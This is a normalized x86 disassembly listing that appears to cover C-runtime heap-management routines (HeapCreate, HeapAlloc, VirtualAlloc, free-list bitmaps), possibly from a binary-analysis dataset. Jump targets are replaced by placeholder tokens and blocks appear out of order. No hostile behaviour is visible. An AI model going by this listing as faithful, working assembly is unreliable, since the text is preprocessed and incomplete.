mov esi [ ebp + 0x14 ]
test [ esi ] 0x1
je r-xdata
mov esi [ ebp + 0x8 ]
push 0x1
push [ esi + 0x18 ]
call sub_409968
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ esi + 0x18 ] 0x0
mov ebx [ ebp + 0x8 ]
push 0x1
push [ ebx + 0x18 ]
jne r-xdata
mov ebx [ ebp + 0x8 ]
push 0x1
push [ ebx + 0x18 ]
call sub_409968
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_406e22
push 0x1
push edi
call sub_409984
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_409968
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_409968
pop ecx
pop ecx
test eax eax
je r-xdata
push 0x1
push edi
call sub_409984
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ esi + 0x18 ]
mov [ edi ] eax
mov ecx [ ebp + 0x14 ]
add ecx 0x8
push ecx
push 0x1
push edi
call sub_409984
pop ecx
pop ecx
test eax eax
je r-xdata
push 0x1
push edi
call sub_409984
pop ecx
pop ecx
test eax eax
je r-xdata
push [ esi + 0x14 ]
push [ ebx + 0x18 ]
push edi
call sub_4099c0
add esp 0xc
cmp [ esi + 0x14 ] 0x4
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
push [ esi + 0x18 ]
call sub_4099a0
pop ecx
test eax eax
je r-xdata
push [ esi + 0x14 ]
add esi 0x8
push esi
push [ ebx + 0x18 ]
call sub_406d54
pop ecx
pop ecx
push eax
push edi
call sub_4099c0
add esp 0xc
jmp r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
test [ esi ] 0x4
je r-xdata
add esi 0x8
push esi
jmp r-xdata
lea eax [ esi + 0x8 ]
push eax
push [ ebx + 0x18 ]
call sub_406d54
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push edi
call sub_40508c
jmp r-xdata
push 0x1
lea eax [ esi + 0x8 ]
push eax
push [ ebx + 0x18 ]
call sub_406d54
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push edi
call sub_405093
jmp r-xdata
push eax
call sub_406d54
pop ecx
pop ecx
mov [ edi ] eax
jmp r-xdata
sub_406ced
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ eax + 0x1c ]
mov ecx [ ecx + 0x4 ]
test ecx ecx
je r-xdata
and [ ebp - 0x4 ] 0x0
push ecx
push [ eax + 0x18 ]
call sub_40508c
or [ ebp - 0x4 ] 0xffffffff
sub_406d54
mov ecx [ esp + 0x8 ]
push esi
mov esi [ esp + 0x8 ]
mov eax [ ecx ]
mov edx [ ecx + 0x4 ]
add eax esi
test edx edx
jl r-xdata
pop esi
retn
mov esi [ edx + esi ]
mov ecx [ ecx + 0x8 ]
mov ecx [ esi + ecx ]
add ecx edx
add eax ecx
sub_406d80
push ebp
mov ebp esp
sub esp 0x4
push ebx
push ecx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebp
push [ ebp + 0x10 ]
mov ecx [ ebp + 0x10 ]
mov ebp [ ebp - 0x4 ]
call sub_405409
push esi
push edi
call eax
pop edi
pop esi
mov ebx ebp
pop ebp
mov ecx [ ebp + 0x10 ]
push ebp
mov ebp ebx
cmp ecx 0x100
jne r-xdata
push ecx
call sub_405409
pop ebp
pop ecx
pop ebx
leave
retn 0xc
mov ecx 0x2
sub_406dcc
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
and [ ebp - 0x4 ] 0x0
mov eax [ rw-data ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
call $+5
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
call eax
jmp r-xdata
push 0xa
call sub_4097b1
push 0x16
call sub_40b11e
pop ecx
pop ecx
push 0x3
call sub_40637a
and [ ebp - 0x4 ] 0x0
sub_406e22
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
and [ ebp - 0x4 ] 0x0
mov eax [ rw-data ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
call $+5
jmp sub_406dcc
mov [ ebp - 0x4 ] 0x1
call eax
jmp r-xdata
and [ ebp - 0x4 ] 0x0
sub_406e78
mov eax [ rw-data ]
test eax eax
je r-xdata
xor eax eax
retn
push [ esp + 0x4 ]
call eax
test eax eax
pop ecx
je r-xdata
push 0x1
pop eax
retn
sub_406e93
xor eax eax
push 0x0
cmp [ esp + 0x8 ] eax
push 0x1000
sete al
push eax
call [ HeapCreate@IAT ]
test eax eax
mov [ rw-data ] eax
je r-xdata
xor eax eax
retn
call sub_406ecf
test eax eax
jne r-xdata
push 0x1
pop eax
retn
push [ rw-data ]
call [ HeapDestroy@IAT ]
sub_406ecf
push 0x140
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
test eax eax
mov [ rw-data ] eax
jne r-xdata
and [ rw-data ] 0x0
and [ rw-data ] 0x0
push 0x1
mov [ rw-data ] eax
mov [ rw-data ] 0x10
pop eax
retn
retn
sub_406f0d
mov eax [ rw-data ]
lea ecx [ eax + eax * 4 ]
mov eax [ rw-data ]
lea ecx [ eax + ecx * 4 ]
xor eax eax
mov edx [ esp + 0x4 ]
sub edx [ eax + 0xc ]
cmp edx 0x100000
jb r-xdata
retn
add eax 0x14
jmp r-xdata
cmp eax ecx
jae r-xdata
sub_406f38
push ebp
mov ebp esp
sub esp 0x14
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
push ebx
push esi
mov eax [ ecx + 0x10 ]
mov esi edx
sub esi [ ecx + 0xc ]
mov ebx [ edx - 0x4 ]
add edx 0xfffffffc
push edi
shr esi 0xf
mov ecx esi
mov edi [ edx - 0x4 ]
imul ecx ecx 0x204
dec ebx
mov [ ebp - 0x4 ] edi
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] ecx
mov ecx [ ebx + edx ]
test cl 0x1
mov [ ebp - 0x8 ] ecx
jne r-xdata
mov edi ebx
sar edi 0x4
dec edi
cmp edi 0x3f
jbe r-xdata
sar ecx 0x4
push 0x3f
dec ecx
pop edi
mov [ ebp + 0xc ] ecx
cmp ecx edi
jbe r-xdata
mov ecx [ ebp - 0x4 ]
and ecx 0x1
mov [ ebp - 0x14 ] ecx
jne r-xdata
push 0x3f
pop edi
mov ecx [ ebx + edx + 0x4 ]
cmp ecx [ ebx + edx + 0x8 ]
jne r-xdata
mov [ ebp + 0xc ] edi
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
sub edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x4 ]
sar ecx 0x4
push 0x3f
mov [ ebp - 0x8 ] edx
dec ecx
pop edx
cmp ecx edx
mov [ ebp + 0xc ] ecx
jbe r-xdata
mov ecx [ ebx + edx + 0x8 ]
mov edi [ ebx + edx + 0x4 ]
mov [ ecx + 0x4 ] edi
mov ecx [ ebx + edx + 0x4 ]
mov edi [ ebx + edx + 0x8 ]
add ebx [ ebp - 0x8 ]
mov [ ecx + 0x8 ] edi
mov [ ebp - 0xc ] ebx
mov ecx [ ebp + 0xc ]
cmp ecx 0x20
jae r-xdata
mov ecx [ ebp - 0x10 ]
lea ecx [ ecx + edi * 8 ]
mov ecx [ ecx + 0x4 ]
mov [ edx + 0x4 ] ecx
mov ecx [ ebp - 0x10 ]
lea ecx [ ecx + edi * 8 ]
mov [ edx + 0x8 ] ecx
mov [ ecx + 0x4 ] edx
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x8 ] edx
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
cmp [ ebp + 0xc ] edi
je r-xdata
add ebx [ ebp - 0x4 ]
mov edi ebx
mov [ ebp - 0xc ] ebx
sar edi 0x4
dec edi
cmp edi edx
jbe r-xdata
mov [ ebp + 0xc ] edx
mov ecx edx
add ecx 0xffffffe0
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0xc ]
lea ecx [ ecx + eax + 0x4 ]
not edi
and [ eax + esi * 4 + 0xc4 ] edi
dec [ ecx ]
jne r-xdata
mov edi 0x80000000
shr edi cl
lea ecx [ ecx + eax + 0x4 ]
not edi
and [ eax + esi * 4 + 0x44 ] edi
dec [ ecx ]
jne r-xdata
mov eax [ ebp - 0x10 ]
mov [ edx ] ebx
mov [ ebx + edx - 0x4 ] ebx
dec [ eax ]
jne r-xdata
mov cl [ edi + eax + 0x4 ]
cmp edi 0x20
mov [ ebp + 0xf ] cl
inc cl
mov [ edi + eax + 0x4 ] cl
jae r-xdata
cmp ecx edi
je r-xdata
mov edi edx
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] edi
mov ecx [ ebp + 0x8 ]
and [ ecx ] edi
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x4 ]
cmp edx [ ecx + 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
mov edi [ VirtualFree@IAT ]
shl ecx 0xf
add ecx [ eax + 0xc ]
mov ebx 0x8000
push 0x4000
push ebx
push ecx
call edi
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov edx 0x80000000
shr edx cl
or [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov ecx [ rw-data ]
mov eax [ eax + 0x10 ]
and [ eax + ecx * 4 + 0xc4 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
dec [ eax + 0x43 ]
mov eax [ rw-data ]
mov ecx [ eax + 0x10 ]
cmp [ ecx + 0x43 ] 0x0
jne r-xdata
lea ecx [ edi - 0x20 ]
mov edi 0x80000000
shr edi cl
lea eax [ eax + esi * 4 + 0xc4 ]
or [ eax ] edi
lea ecx [ edi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
mov ebx 0x80000000
mov ecx edi
shr ebx cl
lea eax [ eax + esi * 4 + 0x44 ]
or [ eax ] ebx
jmp r-xdata
mov ebx 0x80000000
mov ecx edi
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x8 ]
mov ecx [ ecx + 0x4 ]
mov [ edx + 0x4 ] ecx
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov [ edx + 0x8 ] ecx
mov ecx [ ebp + 0xc ]
cmp ecx 0x20
jae r-xdata
cmp [ eax + 0x8 ] 0xffffffff
jne r-xdata
and [ eax + 0x4 ] 0xfffffffe
mov eax [ rw-data ]
mov ebx [ ebp - 0xc ]
add ecx 0xffffffe0
mov edx 0x80000000
shr edx cl
mov ecx [ ebp + 0xc ]
lea ecx [ ecx + eax + 0x4 ]
not edx
and [ eax + esi * 4 + 0xc4 ] edx
dec [ ecx ]
jne r-xdata
mov edx 0x80000000
shr edx cl
lea ecx [ ecx + eax + 0x4 ]
not edx
and [ eax + esi * 4 + 0x44 ] edx
dec [ ecx ]
jne r-xdata
push ebx
push 0x0
push [ eax + 0xc ]
call edi
mov eax [ rw-data ]
push [ eax + 0x10 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
mov eax [ rw-data ]
mov edx [ rw-data ]
lea eax [ eax + eax * 4 ]
shl eax 0x2
mov ecx eax
mov eax [ rw-data ]
sub ecx eax
lea ecx [ ecx + edx - 0x14 ]
push ecx
lea ecx [ eax + 0x14 ]
push ecx
push eax
call sub_4099c0
mov eax [ ebp + 0x8 ]
add esp 0xc
dec [ rw-data ]
cmp eax [ rw-data ]
jbe r-xdata
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] edx
mov ecx [ ebp + 0x8 ]
and [ ecx ] edx
jmp r-xdata
mov ecx [ rw-data ]
mov [ rw-data ] ecx
jmp r-xdata
sub eax 0x14
mov [ rw-data ] eax
mov [ rw-data ] esi
sub_407263
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
mov edx [ rw-data ]
push ebx
push esi
lea eax [ eax + eax * 4 ]
push edi
lea edi [ edx + eax * 4 ]
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] edi
lea ecx [ eax + 0x17 ]
and ecx 0xfffffff0
mov [ ebp - 0x10 ] ecx
sar ecx 0x4
dec ecx
cmp ecx 0x20
jge r-xdata
add ecx 0xffffffe0
or eax 0xffffffff
xor esi esi
shr eax cl
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] eax
or esi 0xffffffff
shr esi cl
or [ ebp - 0x8 ] 0xffffffff
mov [ ebp - 0xc ] esi
jmp r-xdata
cmp ebx [ ebp - 0x4 ]
jne r-xdata
mov ecx [ ebx + 0x4 ]
mov edi [ ebx ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
mov eax [ rw-data ]
mov ebx eax
cmp ebx edi
mov [ ebp + 0x8 ] ebx
jae r-xdata
mov [ rw-data ] ebx
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
cmp edx 0xffffffff
mov [ ebp - 0x4 ] edx
je r-xdata
mov ebx edx
add ebx 0x14
cmp ebx [ ebp - 0x4 ]
mov [ ebp + 0x8 ] ebx
jb r-xdata
mov edx [ eax + 0xc4 ]
mov esi [ eax + 0x44 ]
and edx [ ebp - 0x8 ]
and esi [ ebp - 0xc ]
and [ ebp - 0x4 ] 0x0
lea ecx [ eax + 0x44 ]
or edx esi
mov esi [ ebp - 0xc ]
jne r-xdata
mov ecx [ eax + edx * 4 + 0xc4 ]
mov edi [ eax + edx * 4 + 0x44 ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
jne r-xdata
mov ecx [ ebx + 0x4 ]
mov edi [ ebx ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ ecx + 0x84 ]
inc [ ebp - 0x4 ]
and edx [ ebp - 0x8 ]
add ecx 0x4
mov edi esi
and edi [ ecx ]
or edx edi
je r-xdata
mov ecx edx
xor edi edi
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ eax + edx * 4 + 0x44 ]
and ecx esi
jne r-xdata
cmp ebx [ ebp - 0x4 ]
jae r-xdata
cmp ebx eax
add ebx 0x14
jmp r-xdata
test ecx ecx
jl r-xdata
mov ecx [ eax + edx * 4 + 0xc4 ]
push 0x20
and ecx [ ebp - 0x8 ]
pop edi
jne r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
cmp ebx eax
mov [ ebp + 0x8 ] ebx
jae r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ecx + edi * 8 + 0x4 ]
mov ecx [ edx ]
sub ecx [ ebp - 0x10 ]
mov esi ecx
mov [ ebp - 0x8 ] ecx
sar esi 0x4
dec esi
cmp esi 0x3f
jle r-xdata
shl ecx 0x1
inc edi
jmp r-xdata
push ebx
call sub_40761d
pop ecx
mov ecx [ ebx + 0x10 ]
mov [ ecx ] eax
mov eax [ ebx + 0x10 ]
cmp [ eax ] 0xffffffff
jne r-xdata
mov ebx edx
cmp ebx [ ebp - 0x4 ]
add ebx 0x14
mov [ ebp + 0x8 ] ebx
jmp r-xdata
cmp esi edi
je r-xdata
push 0x3f
pop esi
xor eax eax
jmp r-xdata
jne r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
test ecx ecx
je r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
call sub_40756c
mov ebx eax
test ebx ebx
mov [ ebp + 0x8 ] ebx
je r-xdata
cmp ebx eax
add ebx 0x14
jmp r-xdata
mov esi [ ebp - 0x10 ]
add edx ecx
lea ecx [ esi + 0x1 ]
mov [ edx ] ecx
mov [ edx + esi - 0x4 ] ecx
mov esi [ ebp - 0xc ]
mov ecx [ esi ]
test ecx ecx
lea edi [ ecx + 0x1 ]
mov [ esi ] edi
jne r-xdata
mov [ edx ] ecx
mov [ ecx + edx - 0x4 ] ecx
jmp r-xdata
mov ecx [ edx + 0x8 ]
mov edi [ edx + 0x4 ]
cmp [ ebp - 0x8 ] 0x0
mov [ ecx + 0x4 ] edi
mov ecx [ edx + 0x4 ]
mov edi [ edx + 0x8 ]
mov [ ecx + 0x8 ] edi
je r-xdata
cmp edi 0x20
jge r-xdata
cmp ebx eax
mov [ ebp + 0x8 ] ebx
jae r-xdata
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
lea eax [ edx + 0x4 ]
cmp ebx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
mov edi [ ecx + esi * 8 + 0x4 ]
lea ecx [ ecx + esi * 8 ]
mov [ edx + 0x4 ] edi
mov [ edx + 0x8 ] ecx
mov [ ecx + 0x4 ] edx
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x8 ] edx
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
lea ecx [ edi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea edi [ eax + edi + 0x4 ]
lea ecx [ eax + ecx * 4 + 0xc4 ]
not ebx
and [ ecx ] ebx
dec [ edi ]
mov [ ebp - 0x14 ] ebx
jne r-xdata
mov ebx 0x80000000
mov ecx edi
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea edi [ eax + edi + 0x4 ]
not ebx
mov [ ebp - 0x14 ] ebx
and ebx [ eax + ecx * 4 + 0x44 ]
mov [ eax + ecx * 4 + 0x44 ] ebx
dec [ edi ]
jne r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov cl [ esi + eax + 0x4 ]
cmp esi 0x20
mov [ ebp + 0xb ] cl
jge r-xdata
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
and [ ebx + 0x4 ] ecx
jmp r-xdata
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
and [ ebx ] ecx
jmp r-xdata
and [ rw-data ] 0x0
inc cl
cmp [ ebp + 0xb ] 0x0
mov [ esi + eax + 0x4 ] cl
jne r-xdata
inc cl
cmp [ ebp + 0xb ] 0x0
mov [ esi + eax + 0x4 ] cl
jne r-xdata
mov ecx [ ebp - 0x4 ]
lea edi [ eax + ecx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
mov esi 0x80000000
shr esi cl
or [ edi ] esi
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
or [ ebx + 0x4 ] edi
mov edi 0x80000000
mov ecx esi
shr edi cl
mov ecx [ ebp - 0x4 ]
or [ eax + ecx * 4 + 0x44 ] edi
jmp r-xdata
mov edi 0x80000000
mov ecx esi
shr edi cl
or [ ebx ] edi
sub_40756c
mov eax [ rw-data ]
mov ecx [ rw-data ]
push esi
push edi
xor edi edi
cmp eax ecx
jne r-xdata
mov ecx [ rw-data ]
push 0x41c4
push 0x8
lea eax [ eax + eax * 4 ]
push [ rw-data ]
lea esi [ ecx + eax * 4 ]
call [ HeapAlloc@IAT ]
cmp eax edi
mov [ esi + 0x10 ] eax
je r-xdata
lea eax [ ecx + ecx * 4 + 0x50 ]
shl eax 0x2
push eax
push [ rw-data ]
push edi
push [ rw-data ]
call [ HeapReAlloc@IAT ]
cmp eax edi
je r-xdata
xor eax eax
jmp r-xdata
push 0x4
push 0x2000
push 0x100000
push edi
call [ VirtualAlloc@IAT ]
cmp eax edi
mov [ esi + 0xc ] eax
jne r-xdata
add [ rw-data ] 0x10
mov [ rw-data ] eax
mov eax [ rw-data ]
pop edi
pop esi
retn
or [ esi + 0x8 ] 0xffffffff
mov [ esi ] edi
mov [ esi + 0x4 ] edi
inc [ rw-data ]
mov eax [ esi + 0x10 ]
or [ eax ] 0xffffffff
mov eax esi
push [ esi + 0x10 ]
push edi
push [ rw-data ]
call [ HeapFree@IAT ]
sub_40761d
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
push ebx
push esi
push edi
mov esi [ ecx + 0x10 ]
mov eax [ ecx + 0x8 ]
xor ebx ebx
mov eax ebx
push 0x3f
imul eax eax 0x204
pop edx
lea eax [ eax + esi + 0x144 ]
mov [ ebp - 0x4 ] eax
shl eax 0x1
inc ebx
jmp r-xdata
mov [ eax + 0x8 ] eax
mov [ eax + 0x4 ] eax
add eax 0x8
dec edx
jne r-xdata
mov edi ebx
push 0x4
shl edi 0xf
add edi [ ecx + 0xc ]
push 0x1000
push 0x8000
push edi
call [ VirtualAlloc@IAT ]
test eax eax
jne r-xdata
test eax eax
jl r-xdata
lea edx [ edi + 0x7000 ]
cmp edi edx
ja r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x4 ]
lea ecx [ edi + 0xc ]
add eax 0x1f8
push 0x1
pop edi
mov [ eax + 0x4 ] ecx
mov [ ecx + 0x8 ] eax
lea ecx [ edx + 0xc ]
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
and [ esi + ebx * 4 + 0x44 ] 0x0
mov [ esi + ebx * 4 + 0xc4 ] edi
mov al [ esi + 0x43 ]
mov cl al
inc cl
test al al
mov eax [ ebp + 0x8 ]
mov [ esi + 0x43 ] cl
jne r-xdata
lea eax [ edi + 0x10 ]
pop edi
pop esi
pop ebx
leave
retn
mov edx 0x80000000
mov ecx ebx
shr edx cl
not edx
and [ eax + 0x8 ] edx
mov eax ebx
or [ eax + 0x4 ] edi
or [ eax - 0x8 ] 0xffffffff
or [ eax + 0xfec ] 0xffffffff
lea ecx [ eax + 0xffc ]
mov [ eax - 0x4 ] 0xff0
mov [ eax ] ecx
lea ecx [ eax - 0x1004 ]
mov [ eax + 0x4 ] ecx
mov [ eax + 0xfe8 ] 0xff0
add eax 0x1000
lea ecx [ eax - 0x10 ]
cmp ecx edx
jbe r-xdata
sub_407718
push ebp
mov ebp esp
sub esp 0xc
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov edx edi
lea esi [ eax + 0x17 ]
sub edx [ ecx + 0xc ]
mov eax [ ecx + 0x10 ]
and esi 0xfffffff0
shr edx 0xf
mov ecx edx
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ edi - 0x4 ]
dec ecx
cmp esi ecx
mov [ ebp + 0x10 ] ecx
mov ebx [ ecx + edi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
mov [ ebp - 0x4 ] ebx
jle r-xdata
jge r-xdata
test bl 0x1
jne r-xdata
push 0x1
pop eax
mov ebx [ ebp + 0xc ]
sub [ ebp + 0x10 ] esi
lea ecx [ esi + 0x1 ]
mov [ ebx - 0x4 ] ecx
lea ebx [ ebx + esi - 0x4 ]
mov esi [ ebp + 0x10 ]
mov [ ebp + 0xc ] ebx
sar esi 0x4
dec esi
mov [ ebx - 0x4 ] ecx
cmp esi 0x3f
jbe r-xdata
xor eax eax
jmp r-xdata
add ebx ecx
cmp esi ebx
jg r-xdata
test [ ebp - 0x4 ] 0x1
jne r-xdata
push 0x3f
pop esi
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x4 ]
sar ecx 0x4
dec ecx
cmp ecx 0x3f
mov [ ebp - 0x8 ] ecx
jbe r-xdata
mov ecx [ ebp - 0xc ]
mov edi [ ecx + esi * 8 + 0x4 ]
lea ecx [ ecx + esi * 8 ]
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] ecx
mov [ ecx + 0x4 ] ebx
mov ecx [ ebx + 0x4 ]
mov [ ecx + 0x8 ] ebx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne r-xdata
mov esi [ ebp - 0x4 ]
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
mov ebx [ edi + 0x4 ]
cmp ebx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop ecx
mov [ ebp - 0x8 ] ecx
mov eax [ ebp + 0x10 ]
mov [ ebx ] eax
mov [ eax + ebx - 0x4 ] eax
mov cl [ esi + eax + 0x4 ]
cmp esi 0x20
mov [ ebp + 0xf ] cl
inc cl
mov [ esi + eax + 0x4 ] cl
jae r-xdata
mov ecx [ edi + 0x4 ]
cmp ecx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop esi
mov ecx [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ecx [ edi + 0x4 ]
mov edi [ edi + 0x8 ]
mov [ ecx + 0x8 ] edi
mov ecx [ ebp + 0x10 ]
sub ecx esi
add [ ebp - 0x4 ] ecx
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
cmp ecx 0x20
jae r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov ecx [ edi + 0x8 ]
mov esi [ edi + 0x4 ]
mov [ ecx + 0x4 ] esi
mov ecx [ edi + 0x4 ]
mov esi [ edi + 0x8 ]
mov [ ecx + 0x8 ] esi
mov esi [ ebp + 0x10 ]
add esi [ ebp - 0x4 ]
mov [ ebp + 0x10 ] esi
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
cmp esi 0x20
jae r-xdata
mov edx [ ebp + 0xc ]
mov edi [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
sar edi 0x4
dec edi
lea ecx [ ecx + esi - 0x4 ]
cmp edi 0x3f
jbe r-xdata
add ecx 0xffffffe0
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ ecx ]
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
mov edx 0x80000000
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] edi
lea eax [ eax + edx * 4 + 0x44 ]
mov edx 0x80000000
mov ecx esi
jmp r-xdata
mov edi 0x80000000
mov ecx esi
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] edi
push 0x3f
pop esi
lea ecx [ esi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
lea ecx [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ebx 0x80000000
mov ecx esi
shr ebx cl
lea esi [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ esi ]
jne r-xdata
mov ebx [ ebp - 0xc ]
lea ebx [ ebx + edi * 8 ]
mov [ ebp + 0x10 ] ebx
mov ebx [ ebx + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ebx [ ebp + 0x10 ]
mov [ ecx + 0x8 ] ebx
mov [ ebx + 0x4 ] ecx
mov ebx [ ecx + 0x4 ]
mov [ ebx + 0x8 ] ecx
mov ebx [ ecx + 0x4 ]
cmp ebx [ ecx + 0x8 ]
jne r-xdata
push 0x3f
pop edi
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
shr edx cl
or [ eax ] edx
mov ebx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
lea eax [ edx + esi - 0x4 ]
mov [ eax ] ecx
mov [ ecx + eax - 0x4 ] ecx
jmp r-xdata
mov cl [ edi + eax + 0x4 ]
cmp edi 0x20
mov [ ebp + 0x13 ] cl
inc cl
mov [ edi + eax + 0x4 ] cl
jae r-xdata
lea eax [ esi + 0x1 ]
mov [ edx - 0x4 ] eax
mov [ edx + esi - 0x8 ] eax
jmp r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ edi - 0x20 ]
mov edx 0x80000000
lea ecx [ edi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
